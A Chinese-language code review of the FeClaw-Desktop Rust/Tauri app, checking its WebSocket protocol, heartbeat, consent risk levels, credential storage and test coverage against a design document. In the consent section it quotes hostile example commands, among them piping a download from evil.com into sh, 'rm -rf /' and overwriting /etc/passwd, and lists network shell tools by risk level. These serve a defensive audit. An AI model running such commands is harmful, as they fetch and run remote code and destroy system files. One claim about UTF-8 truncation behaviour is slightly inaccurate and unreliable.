# FeClaw-Desktop Rust 代码审阅报告

> 审阅日期: 2026-06-19
> 审阅范围: `src-tauri/src/{config,engine,auth,ws,ws_types,consent,executor,tray,lib}.rs` + `Cargo.toml`
> 对照文档: `docs/design.md`
> 严重级别: **P0** (阻塞/安全) / **P1** (重要缺陷) / **Q** (疑问/小问题) / ✅ (通过)

---

## 1. 与设计文档的一致性

### 1.1 WS 协议一致性

**✅ WsRequest 已实现的入站类型** (`ws_types.rs:22-47`):
- `command_exec_request`、`file_read_request`、`file_write_request`、`notification`、`pong` — 与设计 §4.3 表的"引擎/Agent → Desktop"前三行对应（notification / pong 是 PR 3 补充）。

**❌ [P1] 缺失 `file_delete_request` 类型**
- 设计 §4.3 明确列出 `file_delete_request` (L3)。
- 代码完全没有此类型，文件删除未实现。这与"风险等级 L3 = 删除"的设计预期不符。MVP 范围内未实现可接受，但应在 `ws_types.rs` 添加占位类型避免协议不一致。

**❌ [P1] 缺失出站 `consent_response` 类型**
- 设计 §4.3 表列出 Desktop → 引擎的 `consent_response`（allow/deny/always）。
- 代码把决策直接合并进 `command_exec_response.payload.reason`（"rejected" + reason），没有独立的 consent 通道。
- 影响：如果未来非 command 类操作（file_read/write/delete）也需要弹窗确认，没有通用 consent 响应结构可用。

**❌ [P1] 缺失出站 `disconnect` 通知**
- 设计 §4.3 列出 `disconnect` 出站消息。
- 代码在 `lib.rs:182` 仅静默 `engine.stop()`，没通过 WS 发 disconnect。Agent 侧无法立即感知 Desktop 下线。

**Q [Q] `timestamp` 字段缺失**
- 设计 §4.3 的消息示例包含 `timestamp`。
- 代码用裸 `serde_json::json!({...})` 构造消息，`WsRequest` 也没有时间字段。
- 影响：Agent 无法基于消息时间戳判断延迟。建议至少在 outbound 消息中加 ISO-8601 timestamp。

**✅ 响应 status 字段**
- 设计 §4.3: `"accepted" | "rejected" | "timeout" | "error"`
- 代码 (`ws.rs:280, 296` 及 file_*_not_implemented): 仅使用 `accepted` / `rejected` / `error`，没有 `timeout` 状态。
- ⚠️ `executor.rs:135` 在命令超时后返回 `exit_code=124`，但外层 `ws.rs:280` 仍标记 status=`"accepted"`。应区分 `accepted` 与 `timeout` 两态。

### 1.2 重连 / 心跳

**✅ 重连策略** (`ws.rs:39-41, 86-92`):
```rust
const HEARTBEAT_INTERVAL: Duration = Duration::from_secs(30);
const MAX_RECONNECT_ATTEMPTS: u32 = 30;
const RECONNECT_DELAY: Duration = Duration::from_secs(1);
```
与设计 §4.2"等待 1s → 再试 … 连续 30 次失败"完全匹配；不是指数退避。

**❌ [P1] 心跳缺失 Pong 超时检测**
- 设计 §4.2: *"Desktop 35s 内未收到 Pong → 判定断连"*。
- 代码 `ws.rs:153-163` 只在 30s 间隔发 `Ping(Vec::new())`，但 `run_loop` 的 `select!` 里**没有任何"Pong 超时 → 主动断开"的分支**。
- 实际行为：仅当 TCP 流本身出错（远端 RST/timeout）时才会触发重连。如果远端进程僵死但 TCP 仍建连，Desktop 永远检测不到。
- 修复方向：在 select! 中加 `tokio::time::sleep_until(last_pong_at + 35s)` 分支，超时主动 `ws.close()` 触发重连。

**✅ 状态指示** (`tray.rs:117-125`):
- 绿/黄/红与设计 §4.2 状态表完全对应（Connected=绿、Connecting/Reconnecting=黄、Disconnected/Failed=红）。
- 设计还列出 ⚫灰色"停止"，代码无灰色（合并入红色）。可接受。

### 1.3 Config / Engine 启动

**✅ Config 默认值** (`config.rs:30-38`):
- `host="127.0.0.1"`, `port=8080`, `mode=Local`, `ws_path="/ws/desktop"` — 与设计 §3.1、§7.1 完全一致。

**✅ 端口冲突扫描** (`config.rs:99-103`):
- `find_free_port` 在 `start..start+10` 范围内找空闲端口 — 与设计 §8 MVP "端口冲突检测（8080 被占用自动换）"一致。

**Q [Q] Engine 启动命令与设计不一致**
- 设计 §7.2 写明：`feclaw --config ~/.feclaw/config.toml`。
- 代码 `engine.rs:81-89` 实际是：`feclaw --host 127.0.0.1 --port <port>`。
- 不传 `--config` 意味着引擎读取默认路径；若用户的 FeClaw 引擎不读 `~/.feclaw/config.toml`，本应用写入的配置就是死数据。
- 修复建议：增加 `--config` 参数，或在文档中说明 engine 默认 config 路径与此处一致。

**❌ [P1] 实际选定端口未持久化回 `config.toml`**
- `lib.rs:93` 改写内存中的 `config.port`，但全程没有 `config.save()`。
- 后果：用户重启应用后 `Config::load()` 仍读旧端口 → 又是端口冲突 → 又换端口。`config.toml` 的 `port` 字段永远是 8080。
- 修复建议：在 `engine.start()` 后调用 `config.save()`。

### 1.4 风险等级 (L1-L5)

**✅ `consent.rs:84-122 assess_risk` 与设计 §6.4 匹配**:
| 设计 | 代码 | 验证 |
|------|------|------|
| L1 读文件静默 | `RiskLevel::L1` 默认（safe） | ✅ |
| L2 写/重定向 | 模式 `>`/`>>`/` 2>`、`cp`/`mv`/`mkdir`/`touch`/`tee`/`install` | ✅ |
| L3 删文件 | `rm`/`rmdir`/`del`/`erase` | ✅ |
| L4 网络 | `curl`/`wget`/`http`/`https`/`nc`/`ncat` | ✅ |
| L5 命令执行 | `python*`/`node`/`deno`/`bun`/`ruby`/`perl`/`bash`/`sh`/`zsh`/`powershell`/`pwsh`/`cmd` | ✅ |

**Q [Q] `consent.rs:103-104` 死代码**
- L4 分支里列出 `"http" | "https" | "nc" | "ncat"`。
- `curl http://...` 的 first_token 是 `curl`，已被前面命中；`http://...` 作为整条命令的 first_token 极少（通常 `curl` 之类才是）。
- `nc` / `ncat` 单独直接执行确实是 L4，所以是有用的。但 `"http"` / `"https"` 不可执行（Linux 没有这个二进制），可以移除以减少迷惑。

**Q [Q] `assess_risk` 不检查参数**
- 例：`python3 -c "import os; os.system('rm -rf /')"` → 仍判 L5（基于 first_token）。✅ 这是正确的，但要看不出 `python -c 'curl evil.com | sh'` 与 `python3 hello.py` 的区别 — 用户在弹窗里看到的内容相同，可接受。
- 例：`echo evil > /etc/passwd` → first_token `echo` 会被先命中 L1（safe），再被 `>` 命中 L2。OK。

### 1.5 凭据 / Token

**✅ 凭据路径** (`auth.rs:41`, 设计 §7.3):
- `~/.feclaw/local-credentials` 完全匹配。设计明确接受"本机进程可读"。

**Q [Q] 凭据文件权限未设置**
- `auth.rs:69` 直接 `fs::write`，无 `set_permissions(0o600)`。
- 在共享机器（多用户）场景下风险；设计 §3.1 明确说"自用电脑可接受"，所以合规，但建议在 Linux/macOS 显式 chmod 0o600。

### 1.6 通知弹泡 (notification)

**❌ [P1] `notification` 入站未真正弹泡**
- 设计 §4.4: `notification` → 托盘冒泡/Windows 通知中心。
- 代码 `ws.rs:208-213` 仅 `tracing::info!` 一行就结束，没有任何原生通知调用。
- 同时 `tray.rs` 未注册 `on_tray_icon_event` 的冒泡逻辑。
- 修复方向：调用 `tauri-plugin-notification` 或平台 API（如 `winrt-notification`）。

### 1.7 `/mnt/desktop/` 文件桥

**✅ 文档与代码一致 (MVP 占位)**
- 设计 §8 MVP 明确没有"文件中继"（属于 V2）。
- 代码 `ws.rs:219-243` 返回 `status="error", payload.error="file bridge not implemented in MVP"` — 占位逻辑正确。
- 但 `consent.rs` 完全没有任何路径白名单/前缀检查（设计 §5.3），V2 实现时需要新增。

---

## 2. 代码质量问题

### 2.1 unwrap() / panic 风险

**✅ 大部分 `.unwrap()` 在测试代码或理论安全位置**：
- `auth.rs:45`: `expect("build reqwest client")` — 仅在 TLS 栈未加载时触发，启动期合理 fail-fast。
- `consent.rs:86`: `unwrap_or("")` — 已经是安全回退。
- `auth.rs:131`: `unwrap_or_default()` — 安全。
- `tray.rs:135-136`: `let _ = tray_icon.set_icon(...)` — 忽略错误，可接受。

**Q [Q] `lib.rs:78` `expect()`**
- `tauri::Builder::default().run(...).expect(...)` — Tauri 主循环失败时直接 panic。
- 没有用户友好的错误对话框；设计未要求，但 Windows 上 panic 会弹"程序已停止"对话框，可接受。

**Q [Q] `ws.rs:122-123` `unwrap_or(&self.url)`**
```rust
let host = self.url.strip_prefix("ws://")
    .or_else(|| self.url.strip_prefix("wss://"))
    .unwrap_or(&self.url);
```
- 没有 ws:// 前缀时把整个 URL 当 Host 头 — 在 wss:// 缺失时正确；但 URL 不规范时 tungstenite 自己会报错。安全。

### 2.2 错误处理

**✅ 大多数 `Result` / `Context` 用法到位**：
- `auth.rs:128-141` 用 `.context()` 包裹网络调用。
- `engine.rs:97, 144` 用 `.context("spawn feclaw engine")`。
- `consent.rs:172-175` 保存失败时 `tracing::warn!` 继续。

**❌ [P1] `consent.rs:172-175` "始终允许"持久化失败静默**
- 用户选 Cancel → 写入 `session_trust` → `save_trusted()` 失败 → 只 log warn。
- 结果：用户认为以后都不用再确认了，但实际上每次启动都会再弹窗。
- 修复建议：失败时让弹窗继续显示或明确提示用户。

**❌ [P1] `auth.rs:75-114 login_or_load` 凭证 race**
- 同时存在 `password` 和 `token` 字段（`auth.rs:19-27`）；`verify_token` 失败后会回退到 `extract_password_from_stdout`。
- 但 `login` 函数 `auth.rs:117` 收不到 token 也不会回退 — 仅在 `login_or_load` 入口统一处理。✅ OK。
- 真正问题：`Credentials::save` (`auth.rs:64-71`) **不原子写**。直接 `fs::write` 截断写入；中途崩溃会留下空文件，下次启动 `serde_json::from_str` 返回 None → 又走完整密码提取路径（stdin 可能已丢）。建议 `tmp + rename`。

### 2.3 不安全代码 / 空指针

**✅ 代码无 `unsafe` 块**（全文 grep 无匹配）。
**✅ `&self` / `&mut self` 用法合理**，没有悬垂引用风险。
**Q [Q] `ws.rs:91, 92` `self.set_status(...).await` 与 `self.outgoing_rx.take()`**：
- 没问题，`run()` 持有 `mut self`，`set_status` 取 `&self`，无冲突。

### 2.4 路径 / 字符串处理

**Q [Q] `executor.rs:152-156` `truncate_output` UTF-8 截断风险**
```rust
fn truncate_output(s: &mut String, max: usize) {
    if s.len() > max {
        s.truncate(max);                 // ← 在字节边界切，可能切碎多字节字符
        s.push_str("\n... [output truncated]");
    }
}
```
- 输入来源：`String::from_utf8_lossy(&bytes)` 已经是合法 UTF-8。
- `s.truncate(max)` 在任意字节偏移处截断，可能切掉一个多字节 UTF-8 字符的尾部 → 留下无效 UTF-8。
- 后续 `serde_json::to_string(&response)` 序列化时 Rust 字符串必须有效 UTF-8，会 panic。
- **修复方向**：按 `is_char_boundary` 找到最近的合法切点再 `truncate`。

**Q [Q] `auth.rs:176-185` `extract_password_from_stdout password=` 匹配**
- `find("password=")` 在任意位置查找，可能误匹配如 `db_password=foo` 或 URL `?password=bar`。
- 当前是 fallback 兜底，误匹配导致取到一个无害值，不致立刻执行危险操作；但 `verify_token` 走过后会用假密码 `login()` 拿到 401，进而触发重试 — 多花一次往返。可接受。

### 2.5 性能 / 资源

**Q [Q] `engine.rs:128-163 wait_healthy` 每次新建 reqwest client**
- 每次 `wait_healthy()` / `health_check()` 都 `reqwest::Client::builder().build()`。client 持有连接池、配置好的 TLS 栈，反复创建浪费。
- 修复建议：把 client 放入 `EngineManager` 结构或 `OnceCell`。

**Q [Q] `ws.rs:64` 无界 mpsc**
- `mpsc::unbounded_channel` 用于出站消息。理论上若引擎疯狂发请求 + Desktop 处理慢，buffer 涨大。MVP 接受；建议在 V2 改 `mpsc::channel(N)` + 背压。

---

## 3. 安全性

### 3.1 网络

**✅ WS URL 使用 `ws://` 而非 `wss://`** (`config.rs:94`):
- 仅绑定 `127.0.0.1` 主机（设计 §3.1 安全约束）。
- 当前 MVP 仅本地模式，云模式未启用。云模式启用时应切到 `wss://` 并校验 TLS 证书（rustls 默认开启）。

**✅ Bearer Token** (`ws.rs:132`):
- `Authorization: Bearer {token}` 头部正确。

**Q [Q] `ws.rs:122-123` Host 头手工构造**
- `host` 字段用 `self.url.strip_prefix("ws://").unwrap_or(&self.url)`。
- 在请求 URI 已含 host 的情况下手工设置 Host 头，可能被某些反向代理接受为注入点。本应用直连 127.0.0.1，无代理。但代码质量上建议删掉手工 Host 头，让 tungstenite 自己生成。

### 3.2 路径 / 命令注入

**✅ `executor.rs:69-75` 使用 `Command::new(command).args(args)`**：
- command 与 args 分别传 tokio::process，没有 shell 解析 — 命令注入不成立。
- 即使 payload 来自被攻陷的引擎，也无法"借助 shell 元字符" — `>`、`$()` 等都是字面量传给可执行文件。

**❌ [P1] `executor.rs:56-67` 自动创建 cwd**
```rust
if !cwd.exists() {
    if let Err(e) = tokio::fs::create_dir_all(cwd).await {
        return ExecResult { ... exit_code: -1 };
    }
}
```
- 若引擎发来 `cwd="/etc"`（Linux 需 root）或 `cwd="C:\\Windows\\System32"` 且无权限，会失败 — OK。
- 但 `cwd="C:\\Users\\Public\\new_dir"` — 自动创建 → 用户只确认了"运行 ls"，却同时创建了新目录，弹窗里没体现。
- 修复建议：cwd 自动创建前至少要纳入弹窗描述，或把目录创建移到 consent 阶段。

**Q [Q] 没有 cwd 路径白名单**
- 设计 §5.3 要求白名单（C:\Users\<用户>\Desktop 等）。
- 当前 cwd 是引擎说了算，理论上可执行任意路径下的命令。
- 这是 MVP 缺失项，与设计预期差距明确。建议 V2 实现。

### 3.3 文件权限

**Q [Q] `~/.feclaw/local-credentials` 模式未设 0o600**（见 §1.5）。

**Q [Q] `~/.feclaw/trusted-commands.json` 模式未设 0o600**：
- 同样是 JSON 明文存用户信任列表。多人共享机器上可被改写 → 植入后门命令。
- 修复建议：写入时 `chmod 0o600`（Linux/macOS）。

### 3.4 拒绝服务

**Q [Q] `executor.rs:16` `MAX_OUTPUT_BYTES = 1 MiB`**：
- 单次执行的 stdout/stderr 上限，避免撑爆 WS 帧。✅ 合理。
- 但 `MAX_OUTPUT_BYTES` 应用 `&mut s, max: usize` 在切到 1 MiB 处可能落在 UTF-8 中间（见 §2.4）。

**✅ `engine.rs:18-20 HEALTH_TIMEOUT=30s`**：
- 启动期最长等 30s 健康检查，超时即失败退出。

**Q [Q] 启动失败时无 UI 反馈**：
- `lib.rs:69-73` 启动 task 失败仅 `tracing::error!`，UI 上托盘图标停在 Disconnected/红色，但用户看不到任何提示。
- 修复建议：弹一个 MessageDialog（用 rfd）显示 startup 错误。

---

## 4. 设计遗漏 / 接口设计

### 4.1 代码实现但文档未提到的部分

- `tray.rs:114-147` `make_circle_icon` 程序化生成图标 — 设计没明确说"用代码生成"，但也没禁止；属于实现细节。

### 4.2 文档提到但代码缺失

| 设计条款 | 状态 |
|----------|------|
| §4.2 35s Pong 超时 | ❌ 缺失 |
| §4.3 `file_delete_request` 入站类型 | ❌ 缺失 |
| §4.3 `consent_response` 出站类型 | ❌ 缺失 |
| §4.3 `disconnect` 出站消息 | ❌ 缺失 |
| §4.3 message `timestamp` 字段 | ❌ 缺失 |
| §4.4 `notification` → 原生通知 | ❌ 仅 log |
| §4.4 "执行中掉线" pending exec_id 队列 | ❌ 缺失 |
| §5.3 路径白名单 | ❌ 缺失（V2 范畴） |
| §6.3 WeChat 降级 | ❌ 缺失（V2 范畴） |
| §8 V2 开机自启 | ❌ `auto-launch` 已在 Cargo.toml 但**未使用** |
| §8 V2 设置界面 | ❌ 缺失 |

### 4.3 接口设计

**Q [Q] `Cargo.toml` 列出但未使用的依赖**
```toml
uuid = { version = "1", features = ["v4"] }        # 未用
chrono = { version = "0.4", features = ["serde"] } # 未用
auto-launch = "0.5"                                # 未用（V2 应启用）
http = "1"                                          # 未直接 import
```
- 编译时间浪费（特别是 chrono 拉了很多时间相关代码）。建议删除或在 V2 实现时启用。
- 设计 §2 已列出 `auto-launch`，说明这是有计划但未实现的依赖。

**Q [Q] `ws_types.rs:77-92 CommandExecResponse` 定义但未使用**
- 实际 `ws.rs:277-286` 用 `serde_json::json!({...})` 内联构造响应，没用这个 typed struct。
- 既然已经定义了类型，应该统一用 typed struct 以避免字段拼写错误。

**Q [Q] `ws_types.rs:95-109 FileReadResponse` 同样未使用**
- `ws.rs:224-229` 用 `json!` 构造。
- 建议要么删掉类型，要么在 `ws.rs` 里改用 typed struct。

### 4.4 启动顺序

**✅ `lib.rs:80-184` 启动流程与设计 §3.1 一致**：
1. Config::load ✅
2. EngineManager::start ✅
3. AuthManager::login_or_load ✅
4. 注册 AppState + 托盘 ✅
5. 建立 WsClient ✅

**Q [Q] `lib.rs:148-151` "Reconnect" 控制消息无实际操作**
```rust
ControlMsg::Reconnect => {
    tracing::info!("control: reconnect requested");
    // The WS client already auto-reconnects up to 30 times.
    // A full restart of the WS task is deferred to a later PR.
}
```
- 托盘菜单有"重新连接"项，点击后什么也不做（仅记一行 log）。
- 建议：至少把 WsClient 改为可中断（用 cancellation token 或 AtomicBool），让 control pump 能强制重启 run() 循环。

---

## 5. 测试覆盖

### 5.1 已覆盖（✅ 充分）

| 模块 | 关键测试 |
|------|---------|
| `auth.rs` | `extract_password` 6 个变体、`Credentials` 序列化、文件不存在路径 |
| `config.rs` | 默认值、`engine_url`/`ws_url`、`toml` roundtrip、`Mode` serde |
| `consent.rs` | 18 个 `assess_risk` 用例（覆盖所有 L1-L5 + 边界） |
| `engine.rs` | 初始状态、status enum、`is_running` 边界 |
| `ws_types.rs` | `WsRequest` 5 种变体 + 最小/多余字段、`Response` roundtrip |
| `executor.rs` | echo 成功、失败、stderr 捕获、cwd 自动创建、timeout、stdout 截断 |

### 5.2 关键路径缺失测试（❌ [P1]）

| 路径 | 缺失测试 |
|------|---------|
| `WsClient::run` 重连循环 | ❌ 仅有结构字段测试，没有 mock 服务器验证重连计数 1..=30、sleep 1s |
| `WsClient::run_loop` 心跳 | ❌ 没有验证 30s 后发 Ping（且没有验证 35s 超时断连） |
| `WsClient::handle_message` 分派 | ❌ command_exec / file_read / file_write / notification 分支无测试 |
| `EngineManager::start` | ❌ 无 spawn 测试（依赖可执行文件，CI 上不可用可接受） |
| `EngineManager::wait_healthy` | ❌ 无 mock HTTP 服务测试 |
| `ConsentManager::request` 弹窗 | ❌ rfd 弹窗交互无法在 headless CI 测试 |
| `ConsentManager::save_trusted` + 持久化 | ❌ 没有 roundtrip 测试 |
| `AuthManager::login` HTTP 路径 | ❌ 没有 mock reqwest 测试 |
| `AuthManager::verify_token` HTTP 路径 | ❌ 没有 mock reqwest 测试 |
| `tray::build_tray` | ❌ 无 GUI 测试 |
| `lib::startup` 端到端 | ❌ 无集成测试 |

### 5.3 测试中已发现的小问题

**✅ 集成测试目录 `src-tauri/tests/` 是占位** (`tests/mod.rs` 仅一行注释)：
- 所有测试都在源文件的 `#[cfg(test)]` 内，符合 Rust 惯例。
- `tests/` 目录当前是空的（仅占位 `mod.rs`）。建议要么删掉它，要么放真正的 integration test。

---

## 6. 总览：优先级建议

### 立即修复 (P0)

无 P0 级别阻塞项。代码可编译、启动流程基本完整。

### 高优先级 (P1)

1. **`ws.rs` 心跳 Pong 超时缺失** — 设计 §4.2 明确要求 35s 超时。
2. **`ws.rs` command_exec_response 缺少 `timeout` 状态** — 设计 §4.3 status 枚举。
3. **`ws_types.rs` 缺失 `file_delete_request` 入站类型** — 设计 §4.3。
4. **`ws_types.rs` 缺失 `consent_response` 出站类型** — 设计 §4.3。
5. **`ws.rs` notification 未弹原生通知** — 设计 §4.4。
6. **`executor.rs` truncate_output UTF-8 切碎** — 可能 panic。
7. **`consent.rs` AlwaysAllow 持久化失败静默** — 用户体验问题。
8. **`engine.rs` 实际选定端口未写回 `config.toml`** — 重启后端口错乱。
9. **`engine.rs` 启动参数未传 `--config`** — 与设计 §7.2 不一致。
10. **`executor.rs` 自动创建 cwd 不在弹窗中告知** — 用户知情权。
11. **`Cargo.toml` uuid / chrono / auto-launch / http 未使用** — 编译时间浪费。

### 中优先级 (P2 / Q)

- `lib.rs` startup 失败无 UI 反馈
- `lib.rs` "Reconnect" 控制消息无实际行为
- 凭据 / trusted-commands 文件权限未设 0o600
- `ws.rs` Host 头手工构造
- `auth.rs` `extract_password_from_stdout` 误匹配风险
- `engine.rs` 每次 health check 新建 reqwest client
- `ws_types.rs` `CommandExecResponse` / `FileReadResponse` 定义但未用

### V2 范围 (设计已声明，不计为本次审计缺陷)

- 路径白名单 (`/mnt/desktop/`)
- 文件读 / 写 / 删中继
- 云模式 (wss://, JWT, 登录界面)
- 开机自启 (auto-launch 已就位)
- 设置界面 (白名单编辑、端口、自启)
- WebView 内嵌引擎 UI
- WeChat 降级
- `disconnect` 出站消息 + pending exec_id 队列

---

## 7. 总结

代码整体质量良好：
- ✅ 错误处理统一 `anyhow::Result` + `.context()`。
- ✅ 测试覆盖核心逻辑（特别是 `consent.rs`、`ws_types.rs`、`executor.rs` 充分）。
- ✅ 安全底线正确（无 shell 解析、无 `unsafe`、token 仅本地、ws:// 限定 127.0.0.1）。
- ✅ 重连策略、心跳间隔、端口扫描、风险等级映射都和设计文档一致。

主要差距集中在：
1. **WS 协议完整性**（§1.1）— 缺 `file_delete_request` / `consent_response` / `disconnect` / `timestamp` / `timeout` 状态。
2. **心跳完整性**（§1.2）— 设计要 35s Pong 超时未实现。
3. **少量 UX 缺陷**（启动失败无提示、AlwaysAllow 失败静默、Reconnect 无操作）。

按 P1 修复后即可视为严格符合设计 v1 的 MVP 完成状态。